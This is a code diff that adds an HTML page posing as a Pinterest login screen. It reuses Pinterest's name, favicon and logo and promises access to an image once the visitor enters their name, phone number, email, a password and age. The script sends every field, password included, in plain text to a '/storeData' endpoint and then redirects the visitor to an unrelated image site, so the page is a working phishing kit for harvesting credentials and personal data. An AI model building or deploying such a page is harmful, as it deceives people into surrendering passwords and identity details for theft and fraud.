@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome to Pinterest</title>
+    <link rel="icon" href="https://www.pinterest.com/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <div class="signup-box">
+            <img src="assets/pinterest-logo.png" alt="Pinterest Logo" class="logo">
+            <h1>Log in to see more</h1>
+            <p class="subtitle">Find new ideas to try</p>
+
+            <form id="signupForm">
+                <div class="input-group">
+                    <input type="text" id="firstName" placeholder="First Name" required>
+                </div>
+                <div class="input-group">
+                    <input type="text" id="lastName" placeholder="Last Name" required>
+                </div>
+                <div class="input-group">
+                    <input type="tel" id="mobileNumber" placeholder="Mobile Number" required pattern="^\d{10}$" title="Please enter a valid 10-digit mobile number">
+                </div>
+                <div class="input-group">
+                    <input type="email" id="email" placeholder="Mail" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Create a password" required>
+                </div>
+                <div class="input-group">
+                    <input type="number" id="age" placeholder="Age" required>
+                </div>
+                <button type="submit" class="btn btn-pinterest">Continue to view the image</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('signupForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent form submission to a server
+
+            // Get all form data
+            const mobileNumber = document.getElementById('mobileNumber').value;
+
+            // Mobile number validation (Custom validation)
+            const phoneRegex = /^\d{10}$/;
+            if (!phoneRegex.test(mobileNumber)) {
+                alert('Please enter a valid 10-digit mobile number.');
+                return; // Stop form submission
+            }
+
+            // If validation is successful, proceed with sending data
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const age = document.getElementById('age').value;
+
+            // Send data to the server using fetch
+            fetch('http://localhost:3000/storeData', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    firstName: firstName,
+                    lastName: lastName,
+                    mobileNumber: mobileNumber,
+                    email: email,
+                    password: password,
+                    age: age,
+                }),
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Data stored successfully');
+                    window.location.href = 'https://photospace.life/image.php?id=8067I8.png'; // Redirect to a new page
+                } else {
+                    throw new Error('Failed to store data');
+                }
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                alert('Something went wrong. Please try again later.');
+            });
+        });
+    </script>
+</body>
+</html>
